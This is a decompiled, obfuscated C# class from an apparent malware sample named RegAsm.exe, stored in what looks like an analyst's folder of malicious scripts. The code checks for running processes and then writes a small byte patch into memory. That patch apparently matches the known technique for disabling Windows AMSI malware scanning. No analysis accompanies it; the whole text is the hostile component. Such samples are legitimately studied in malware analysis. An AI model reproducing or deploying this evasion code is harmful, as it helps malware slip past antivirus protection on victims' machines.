// Decompiled with JetBrains decompiler
// Type: tWG.hW8
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace tWG
{
  internal class hW8
  {
    private static readonly byte[] x64;
    private static readonly byte[] x86;
    internal static hW8 GlS;

    public static void PCy()
    {
      try
      {
        if (Process.GetProcessesByName(w4.bx(11612, w4.vY)).Length != 0 || hW8.ilU((object) w4.bx(11630, w4.vY)).Length != 0)
          return;
        if (!NdD.bx(NdD.gI3))
          vIq.bx(hW8.x86, vIq.jIm);
        else
          vIq.bx(hW8.x64, vIq.jIm);
      }
      catch
      {
      }
    }

    private static void zCT(byte[] _param0) => aP.bx(6, new object[1]
    {
      (object) _param0
    }, (object) null, aP.cB);

    private static bool DCw()
    {
      bool flag = true;
      if (IntPtr.Size == 4)
        goto label_2;
label_1:
      return flag;
label_2:
      flag = false;
      goto label_1;
    }

    public hW8()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    static hW8()
    {
      yd.bx(yd.EI);
      hW8.x64 = new byte[6]
      {
        (byte) 184,
        (byte) 87,
        (byte) 0,
        (byte) 7,
        (byte) 128,
        (byte) 195
      };
      byte[] numArray = new byte[8];
      // ISSUE: field reference
      hW8.yl2((object) numArray, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0030C50C67E839472CD612D6033109F5E032987E48E367247F29C0EB30A1D3EB5FC));
      hW8.x86 = numArray;
    }

    internal static object ilU([In] object obj0) => (object) Process.GetProcessesByName((string) obj0);

    internal static bool ulC() => hW8.GlS == null;

    internal static hW8 slj() => hW8.GlS;

    internal static void yl2([In] object obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray((Array) obj0, obj1);
  }
}
